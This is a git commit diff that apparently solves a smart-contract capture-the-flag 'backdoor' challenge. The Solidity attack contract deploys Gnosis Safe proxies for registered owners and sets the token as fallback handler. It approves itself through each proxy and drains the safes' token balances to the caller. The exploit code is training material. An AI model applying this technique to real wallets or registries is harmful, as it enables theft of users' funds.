ca3fc1fbb43f0d57f0569d54663c9f70539f21ef
zhao.lu <luzhao233@gmail.com>
2022-07-07 13:09:51 +0800

    complete backdoor challenge btw, the solution is by GnosisSafe's fallbackHandler. When cannot find method in  GnosisSafe, proxy call handle.

--- contracts/backdoor/BackdoorAttack.sol
+++ contracts/backdoor/BackdoorAttack.sol
@@ -5,7 +5,6 @@ import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "./WalletRegistry.sol";
-import "hardhat/console.sol";
 contract BackdoorAttack is Ownable{
     WalletRegistry private _walletRegistry;
     GnosisSafeProxyFactory private _proxyFactory;
@@ -23,13 +22,16 @@ contract BackdoorAttack is Ownable{
         for(;i<owners.length; i++){
             address[] memory _owners = new address[](1);
             _owners[0] = owners[i];
-            console.log(address(_token));
-            bytes memory tokenCallData = abi.encodeWithSignature("approve(address,amount)", address(this), type(uint256).max);
+//            bytes memory tokenCallData = abi.encodeWithSignature("approve(address,amount)", address(this), type(uint256).max);
             bytes memory initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
-                                                        _owners, 1, address(_token), tokenCallData, address(0), address(0), 0, address(0));
+                                                        _owners, 1, address(0), bytes(""), address(_token), address(0), 0, address(0));
             uint256 saltNonce = 1;
+            // complete create
             GnosisSafeProxy proxy = _proxyFactory.createProxyWithCallback(address(_gnosisSafeAddress), initializer, saltNonce, _walletRegistry);
-            _token.transferFrom(address(proxy), address(this), _token.balanceOf(address(proxy)));
+            // next execute tx by attacker
+            bytes memory tokenCallData = abi.encodeWithSignature("approve(address,uint256)", address(this), 2**256-1);
+            address(proxy).call{value: 0}(tokenCallData);
+            _token.transferFrom(address(proxy), msg.sender, _token.balanceOf(address(proxy)));
         }
     }
 }
